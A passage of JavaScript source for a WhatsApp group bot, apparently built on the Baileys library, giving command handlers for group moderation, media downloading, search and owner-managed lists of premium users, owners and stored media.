Lucy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antilinkgc) return replygcGhost('Already deactivated')
let off = ntlinkgc.indexOf(from)
ntlinkgc.splice(off, 1)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replygcGhost('Success in turning off antiwame in this group')
} else {
await replygcGhost(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
   case 'leavegc': {
                if (!GhostTheCreator) return GhostStickOwner()
                await Lucy.groupLeave(m.chat)
                await replygcGhost(`Done`)
            }
            break
case 'add': {
if (!m.isGroup) return GhostStickGroup()
if (!isBotAdmins) return GhostStickBotAdmin()
if (!GhostTheCreator) return GhostStickOwner()
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Lucy.groupParticipantsUpdate(m.chat, [users], 'add')
await replygcGhost(`Done`)
}
break
case 'closetime': {
if (!m.isGroup) return GhostStickGroup()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (!isBotAdmins) return GhostStickBotAdmin()
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replygcGhost('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replygcGhost(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
Lucy.groupSettingUpdate(from, 'announcement')
replygcGhost(close)
}, timer)
}
break
           case 'ephemeral': {
                if (!m.isGroup) return GhostStickGroup()
                if (!isBotAdmins) return GhostStickBotAdmin()
                if (!isAdmins) return GhostStickAdmin()
                if (!text) return replygcGhost('Enter the value enable/disable')
                if (args[0] === 'enable') {
                    await Lucy.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                } else if (args[0] === 'disable') {
                    await Lucy.sendMessage(m.chat, { disappearingMessagesInChat: false })
                    await replygcGhost(`Done`)
                }
            }
            break
            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return replygcGhost('The message was not sent by a bot!')
                 Lucy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
                if (!m.isGroup) return GhostStickGroup()
                if (!isBotAdmins) return GhostStickBotAdmin()
                let response = await Lucy.groupInviteCode(m.chat)
                Lucy.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
case 'opentime': {
if (!m.isGroup) return GhostStickGroup()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (!isBotAdmins) return GhostStickBotAdmin()
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replygcGhost('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replygcGhost(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
Lucy.groupSettingUpdate(from, 'not_announcement')
replygcGhost(open)
}, timer)
}
break
case 'kick': {
if (!m.isGroup) return GhostStickGroup()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (!isBotAdmins) return GhostStickBotAdmin()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Lucy.groupParticipantsUpdate(m.chat, [users], 'remove')
await replygcGhost(`Done`)
}
break
case 'setbotname':{
if (!GhostTheCreator) return GhostStickOwner()
if (!text) return replygcGhost(`Where is the name?\nExample: ${prefix + command} Cheems Bot`)
    await Lucy.updateProfileName(text)
    replygcGhost(`Success in changing the name of bot's number`)
    }
    break
case 'setbotbio':{
if (!GhostTheCreator) return GhostStickOwner()
if (!text) return replygcGhost(`Where is the text?\nExample: ${prefix + command} Cheems Bot`)
    await Lucy.updateProfileStatus(text)
    replygcGhost(`Success in changing the bio of bot's number`)
    }
    break
    case 'setgroupname': case 'setsubject': {
                if (!m.isGroup) return GhostStickGroup()
                if (!isBotAdmins) return GhostStickBotAdmin()
                if (!isAdmins) return GhostStickAdmin()
                if (!text) return replygcGhost('Text ?')
                await Lucy.groupUpdateSubject(m.chat, text)
                await replygcGhost(`Done`)
            }
            break
          case 'setdesc': case 'setdesk': {
                if (!m.isGroup) return GhostStickGroup()
                if (!isBotAdmins) return GhostStickBotAdmin()
                if (!isAdmins) return GhostStickAdmin()
                if (!text) return replygcGhost('Text ?')
                await Lucy.groupUpdateDescription(m.chat, text)
                await replygcGhost(`Done`)
            }
            break
case 'setppgroup': case 'setgcpp': case 'setgrouppp': {
if (!m.isGroup) return GhostStickGroup()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (!isBotAdmins) return GhostStickBotAdmin()
if (!quoted) return replygcGhost(`Where is the picture?`)
if (!/image/.test(mime)) return replygcGhost(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return replygcGhost(`Send/Reply Image With Caption ${prefix + command}`)
var mediz = await Lucy.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await Lucy.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
replygcGhost(`Success`)
} else {
var memeg = await Lucy.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
replygcGhost(`Success`)
}
}
break
case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return GhostStickGroup()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (!isBotAdmins) return GhostStickBotAdmin()
    await Lucy.removeProfilePicture(from)
    }
    break
case 'deleteppbot': case 'delppbot': {
if (!GhostTheCreator) return GhostStickOwner()
    await Lucy.removeProfilePicture(Lucy.user.id)
    replygcGhost(`Success in deleting bot's profile picture`)
    }
    break
case 'promote': {
if (!m.isGroup) return GhostStickGroup()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (!isBotAdmins) return GhostStickBotAdmin()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Lucy.groupParticipantsUpdate(m.chat, [users], 'promote')
await replygcGhost(`Done`)
}
break
case 'demote': {
if (!m.isGroup) return GhostStickGroup()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (!isBotAdmins) return GhostStickBotAdmin()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Lucy.groupParticipantsUpdate(m.chat, [users], 'demote')
await replygcGhost(`Done`)
}
break
case 'hidetag': {
if (!m.isGroup) return GhostStickGroup()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (!isBotAdmins) return GhostStickBotAdmin()
Lucy.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'hidetag2': {
if (!m.isGroup) return GhostStickGroup()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (!isBotAdmins) return GhostStickBotAdmin()
               if (!m.quoted) return replygcGhost(`Reply message with caption ${prefix + command}`)
               Lucy.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break

case 'tagall': {
if (!m.isGroup) return GhostStickGroup()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (!isBotAdmins) return GhostStickBotAdmin()
me = m.sender
let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝ 
 
 😶 *Tagger :*  @${me.split('@')[0]}
 🌿 *Message : ${q ? q : 'no message'}*\n\n`
for (let mem of participants) {
teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
}
Lucy.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'ebinary': {
if (!q) return replygcGhost(`Send/reply text with captions ${prefix + command}`)
GhostStickWait()
let { eBinary } = require('./scrape/binary')
let eb = await eBinary(`${q}`)
replygcGhost(eb)
}
break
case 'dbinary': {
if (!q) return replygcGhost(`Send/reply text with captions ${prefix + command}`)
GhostStickWait()
let { dBinary } = require('./scrape/binary')
let db = await dBinary(`${q}`)
replygcGhost(db)
}
break
case 'remini': {
			if (!quoted) return replygcGhost(`Where is the picture?`)
			if (!/image/.test(mime)) return replygcGhost(`Send/Reply Photos With Captions ${prefix + command}`)
			GhostStickWait()
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			Lucy.sendMessage(m.chat, { image: proses, caption: mess.success}, { quoted: m})
			}
			break
			case 'gimage': {
                if (!text) return replygcGhost(`Example : ${prefix + command} carry minati`)
                GhostStickWait()
                let gis = require('g-i-s')
                gis(text, async (error, result) => {
                    n = result
                    images = n[Math.floor(Math.random() * n.length)].url
                    Lucy.sendMessage(m.chat, { image: { url: images}, caption: `*-------「 GIMAGE SEARCH 」-------*\n🤠 *Query* : ${text}\n🔗 *Media Url* : ${images}`}, { quoted: m })
                })
            }
            case 'gimage': {

       if (!text) return replygcGhost(`Example : ${prefix + command} kaori cicak`
)
        Ghostezyanu = await fetchJson(`https://api.akuari.my.id/search/googleimage?query=${text}`)

        n = Ghostezyanu.result

        images = n[Math.floor(Math.random() * n.length)]


                Lucy.sendMessage(m.chat, { image: { url: images}, caption: `*-------「 GIMAGE SEARCH 」-------*\n🤠 *Query* : ${text}\n🔗 *Media Url* : ${images}`}, { quoted: m })
        }

        break
			case 'mediafire': {
	if (args.length == 0) return replygcGhost(`Where is the link ?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return replygcGhost(`The link you provided is invalid`)
	const { mediafireDl } = require('./lib/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 100) return replygcGhost('Oops, the file is too big...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
replygcGhost(`${result4}`)
Lucy.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break
case 'tiktokxx':{ 
if (!text) return replygcGhost( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replygcGhost(`Link Invalid!!`)
GhostStickWait()
require('./lib/tiktok').Tiktok(q).then( data => {
Lucy.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'tiktokaudioxx':{
if (!text) return replygcGhost( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replygcGhost(`Link Invalid!!`)
GhostStickWait()
require('./lib/tiktok').Tiktok(q).then( data => {
Lucy.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'google': {
if (!q) return replygcGhost(`Example : ${prefix + command} ${botname}`)
GhostStickWait()
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
replygcGhost(teks)
})
}
break
case 'happymod':{
if (!q) return replygcGhost(`Example ${prefix+command} Sufway surfer mod`)
GhostStickWait()
let kat = await scp1.happymod(q)
replygcGhost(util.format(kat))
}
break
case 'search':
case 'yts': case 'ytsearch': {
                if (!text) return replygcGhost(`Example : ${prefix + command} story wa anime`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
                }
                Lucy.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
            case 'play': case 'ytplay': {
                if (!q) return replygcGhost(`Exemplo : ${prefix + command} falling`)
                let yts = require("yt-search")
                let pesquisaa = await yts(q)
                let resultadoo = pesquisaa.videos[Math.floor(Math.random() * pesquisaa.videos.length)]
                let caption = `┆📄 *Título : ${resultadoo.title}*

┆🕑 *Duração : ${resultadoo.timestamp}*`
                Lucy.sendPoll(m.chat, caption, [`mp3 ${resultadoo.url}`,`mp4 ${resultadoo.url}`])
            }
            break

case 'mp3': {
if (!q) return replygcGhost(`Exemplo : ${prefix + command} falling`)
const Ghostplaymp3 = require('./lib/ytdl2')
let yts = require("youtube-yts")
        let pesquisa = await yts(q)
        let resultado = pesquisa.videos[0]
const resultado2 = await Ghostplaymp3.mp3(resultado.url)
await Lucy.sendMessage(m.chat, {
    audio: fs.readFileSync(resultado2.path),
    fileName: resultado.title + '.mp3',
    mimetype: 'audio/mpeg', ptt: true,
    contextInfo:{
        externalAdReply:{
            showAdAttribution: true,
            title: resultado.title,
            body: `0:00 ━━━●──── ${resultado.timestamp}`,
            thumbnail: await fetchBuffer(resultado2.meta.image),
            mediaType: false,
            mediaUrl: resultado.url,
        }

    },
}, { quoted: m })
await fs.unlinkSync(resultado2.path)
}
break
case "ytmp3": case "ytaudio":
const Ghostaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !Ghostaudp3.isYTUrl(text)) return replygcGhost(`Cadê o link do youtube?\nExemplo: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
const audio=await Ghostaudp3.mp3(text)
await Lucy.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            showAdAttribution: true,
            title: audio.meta.title,
            body: `58 ━━━●──── ${resultado.timestamp}`,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType: false,
            mediaUrl: text,
        }

    },
},{quoted: m })
await fs.unlinkSync(audio.path)
break
case 'mp4': case 'ytvideo': {
const Ghostvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !Ghostvidoh.isYTUrl(text)) replygcGhost(`Onde está o link??\n\nExemplo : ${prefix}mp4 link`)
const vid = await Ghostvidoh.mp4(text)
const ytc=`
*📄 Título:* ${vid.title}
*🖼️ Qualidade:* ${vid.quality}`
await Lucy.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'ytvxxx': case 'ytmp4xxx': case 'mp4xxx':{
if (!text) return replygcGhost('Enter the link!!!')
GhostStickWait()
downloadMp4(text)
}
break
case 'ytaxxx': case 'ytmp3xxx': case 'mp3xxx':{
if (!text) return replygcGhost('Enter the link!!!')
GhostStickWait()
downloadMp3(text)
}
break  
case 'getcase':
if (!GhostTheCreator) return GhostStickOwner()
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("lucy.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
replygcGhost(`${getCase(q)}`)
break
case 'addprem':
if (!GhostTheCreator) return GhostStickOwner()
if (!args[0]) return replygcGhost(`Use ${prefix+command} number\nExample ${prefix+command} 558181718175`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Lucy.onWhatsApp(prrkek)
if (ceknya.length == 0) return replygcGhost(`Enter a valid and registered number on WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replygcGhost(`The Number ${prrkek} Has Been Premium!`)
break
case 'delprem':
if (!GhostTheCreator) return GhostStickOwner()
if (!args[0]) return replygcGhost(`Use ${prefix+command} nomor\nExample ${prefix+command} 558181718175`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replygcGhost(`The Number ${ya} Has Been Removed Premium!`)
break
case 'addbadword':{
if (!GhostTheCreator) return GhostStickOwner()
if (args.length < 1) return replygcGhost('Whats the word?')
if (BadGhost.includes(q)) return replygcGhost("The word is already in use")
BadGhost.push(q)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadGhost))
replygcGhost(`Success Adding Bad Word\nCheck by typing ${prefix}listbadword`)
}
break
case 'delbadword':{
if (!GhostTheCreator) return GhostStickOwner()
if (args.length < 1) return replygcGhost('Enter the word')
if (!BadGhost.includes(q)) return replygcGhost("The word does not exist in the database")
let wanu = BadGhost.indexOf(q)
BadGhost.splice(wanu, 1)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadGhost))
replygcGhost(`Success deleting bad word ${q}`)
}
break
case 'listbadword':{
let teks = '┌──⭓「 *BadWord List* 」\n│\n'
for (let x of BadGhost) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${BadGhost.length}*`
replygcGhost(teks)
}
break
case 'addvideo':{
if (!GhostTheCreator) return GhostStickOwner()
if (args.length < 1) return replygcGhost('Whats the video name?')
if (VideoGhost.includes(q)) return replygcGhost("The name is already in use")
let delb = await Lucy.downloadAndSaveMediaMessage(quoted)
VideoGhost.push(q)
await fsx.copy(delb, `./GhostMedia/video/${q}.mp4`)
fs.writeFileSync('./GhostMedia/database/Ghostvideo.json', JSON.stringify(VideoGhost))
fs.unlinkSync(delb)
replygcGhost(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!GhostTheCreator) return GhostStickOwner()
if (args.length < 1) return replygcGhost('Enter the video name')
if (!VideoGhost.includes(q)) return replygcGhost("The name does not exist in the database")
let wanu = VideoGhost.indexOf(q)
VideoGhost.splice(wanu, 1)
fs.writeFileSync('./GhostMedia/database/Ghostvideo.json', JSON.stringify(VideoGhost))
fs.unlinkSync(`./GhostMedia/video/${q}.mp4`)
replygcGhost(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoGhost) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoGhost.length}*`
replygcGhost(teks)
}
break
case 'addimage':{
if (!GhostTheCreator) return GhostStickOwner()
if (args.length < 1) return replygcGhost('Whats the image name?')
if (ImageGhost.includes(q)) return replygcGhost("The name is already in use")
let delb = await Lucy.downloadAndSaveMediaMessage(quoted)
ImageGhost.push(q)
await fsx.copy(delb, `./GhostMedia/image/${q}.jpg`)
fs.writeFileSync('./GhostMedia/database/Ghostimage.json', JSON.stringify(ImageGhost))
fs.unlinkSync(delb)
replygcGhost(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!GhostTheCreator) return GhostStickOwner()
if (args.length < 1) return replygcGhost('Enter the image name')
if (!ImageGhost.includes(q)) return replygcGhost("The name does not exist in the database")
let wanu = ImageGhost.indexOf(q)
ImageGhost.splice(wanu, 1)
fs.writeFileSync('./GhostMedia/database/Ghostimage.json', JSON.stringify(ImageGhost))
fs.unlinkSync(`./GhostMedia/image/${q}.jpg`)
replygcGhost(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImageGhost) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageGhost.length}*`
replygcGhost(teks)
}
break
case 'addsticker':{
if (!GhostTheCreator) return GhostStickOwner()
if (args.length < 1) return replygcGhost('Whats the sticker name?')
if (StickerGhost.includes(q)) return replygcGhost("The name is already in use")
let delb = await Lucy.downloadAndSaveMediaMessage(quoted)
StickerGhost.push(q)
await fsx.copy(delb, `./GhostMedia/sticker/${q}.webp`)
fs.writeFileSync('./GhostMedia/database/Ghoststicker.json', JSON.stringify(StickerGhost))
fs.unlinkSync(delb)
replygcGhost(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!GhostTheCreator) return GhostStickOwner()
if (args.length < 1) return replygcGhost('Enter the sticker name')
if (!StickerGhost.includes(q)) return replygcGhost("The name does not exist in the database")
let wanu = StickerGhost.indexOf(q)
StickerGhost.splice(wanu, 1)
fs.writeFileSync('./GhostMedia/database/Ghoststicker.json', JSON.stringify(StickerGhost))
fs.unlinkSync(`./GhostMedia/sticker/${q}.webp`)
replygcGhost(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of StickerGhost) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerGhost.length}*`
replygcGhost(teks)
}
break
case 'addvn':{
if (!GhostTheCreator) return GhostStickOwner()
if (args.length < 1) return replygcGhost('Whats the audio name?')
if (VoiceNoteGhost.includes(q)) return replygcGhost("The name is already in use")
let delb = await Lucy.downloadAndSaveMediaMessage(quoted)
VoiceNoteGhost.push(q)
await fsx.copy(delb, `./GhostMedia/audio/${q}.mp3`)
fs.writeFileSync('./GhostMedia/database/Ghostvn.json', JSON.stringify(VoiceNoteGhost))
fs.unlinkSync(delb)
replygcGhost(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!GhostTheCreator) return GhostStickOwner()
if (args.length < 1) return replygcGhost('Enter the vn name')
if (!VoiceNoteGhost.includes(q)) return replygcGhost("The name does not exist in the database")
let wanu = VoiceNoteGhost.indexOf(q)
VoiceNoteGhost.splice(wanu, 1)
fs.writeFileSync('./GhostMedia/database/Ghostvn.json', JSON.stringify(VoiceNoteGhost))
fs.unlinkSync(`./GhostMedia/audio/${q}.mp3`)
replygcGhost(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNoteGhost) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteGhost.length}*`
replygcGhost(teks)
}
break
case 'addowner':
if (!GhostTheCreator) return GhostStickOwner()
if (!args[0]) return replygcGhost(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Lucy.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcGhost(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcGhost(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!GhostTheCreator) return GhostStickOwner()
if (!args[0]) return replygcGhost(`Use ${prefix+command} nomor\nExample ${prefix+command} 558181718175`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcGhost(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listpremium': case 'listprem':
teks = '*Premium List*\n\n'
for (let Lucy of prem) {
teks += `- ${Lucy}\n`
}
teks += `\n*Total : ${prem.length}*`
Lucy.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'setcmd': {
                if (!m.quoted) return replygcGhost('Reply Message!')
                if (!m.quoted.fileSha256) return replygcGhost('SHA256 Hash Missing')
                if (!text) return replygcGhost(`For What Command?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygcGhost('You have no permission to change this sticker command')
                global.db.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                replygcGhost(`Done!`)
            }
            break
case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return replygcGhost(`No hashes`)
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygcGhost('You have no permission to delete this sticker command')             
                delete global.db.sticker[hash]
                replygcGhost(`Done!`)
            }
            break
case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                Lucy.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'lockcmd': {
                if (!isCreator) return GhostStickOwner()
                if (!m.quoted) return replygcGhost('Reply Message!')
                if (!m.quoted.fileSha256) return replygcGhost('SHA256 Hash Missing')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.sticker)) return replygcGhost('Hash not found in database')
                global.db.sticker[hash].locked = !/^un/i.test(command)
                replygcGhost('Done!')
            }
            break
case 'addmsg': {
                if (!m.quoted) return replygcGhost('Reply Message You Want To Save In Database')
                if (!text) return replygcGhost(`Example : ${prefix + command} filename`)
                let msgs = global.db.database
                if (text.toLowerCase() in msgs) return replygcGhost(`'${text}' registered in the message list`)
                msgs[text.toLowerCase()] = quoted.fakeObj
replygcGhost(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
case 'getmsg': {
                if (!text) return replygcGhost(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
                let msgs = global.db.database
                if (!(text.toLowerCase() in msgs)) return replygcGhost(`'${text}' not listed in the message list`)
                Lucy.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        replygcGhost(teks)
	    }
	    break
	case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.database
	        if (!(text.toLowerCase() in msgs)) return replygcGhost(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		replygcGhost(`Successfully deleted '${text}' from the message list`)
            }
	    break
case 'setexif': {
               if (!GhostTheCreator) return GhostStickOwner()
               if (!text) return replygcGhost(`Example : ${prefix + command} packname|author`)
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          replygcGhost(`Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`)
            }
            break
case 'getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await Lucy.fetchStatus(who)
    replygcGhost(bio.status)
  } catch {
    if (text) return replygcGhost(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await Lucy.fetchStatus(who)
      replygcGhost(bio.status)
    } catch {
      return replygcGhost(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break
case 'setppbot': case 'setbotpp': {
if (!GhostTheCreator) return GhostStickOwner()
if (!quoted) return replygcGhost(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replygcGhost(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return replygcGhost(`Send/Reply Image With Caption ${prefix + command}`)
var medis = await Lucy.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(medis)
await Lucy.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replygcGhost(`Success`)
} else {
var memeg = await Lucy.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replygcGhost(`Success`)
}
}
break
case 'creategc': case 'creategroup': {
if (!GhostTheCreator) return GhostStickOwner()
if (!args.join(" ")) return replygcGhost(`Use ${prefix+command} groupname`)
try {
let cret = await Lucy.groupCreate(args.join(" "), [])
let response = await Lucy.groupInviteCode(cret.id)
teks = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
       `
Lucy.sendMessage(m.chat, { text:teks, mentions: await Lucy.parseMention(teks)}, {quoted:m})
} catch {
